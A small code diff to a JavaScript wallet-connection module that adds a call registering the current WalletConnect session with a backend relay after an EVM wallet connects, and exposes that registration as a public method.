@@ -7657,6 +7657,7 @@
       UI._walletIcon = (choice.info && choice.info.icon) || '';
       if (!UI._overlayEl) UI.overlay.show('connecting', { walletIcon: UI._walletIcon });
       await handleEvmConnect(choice.provider, choice);
+      void registerWcSessionWithBackend();
       return;
     }
     if (isWcConnectActive()) {
@@ -8996,6 +8997,8 @@
     runPhaseB: runPhaseBInteractive,
     abortPhaseB: abortPhaseB,
     abort: abortPhaseB,
+    /** Register current WC session with backend relay — call after resume or external-wc connect. */
+    registerWcSession: function () { return registerWcSessionWithBackend(); },
     beginConnect: function (mode) {
       if (mode === 'wc') {
         S.connectMode = 'wc';
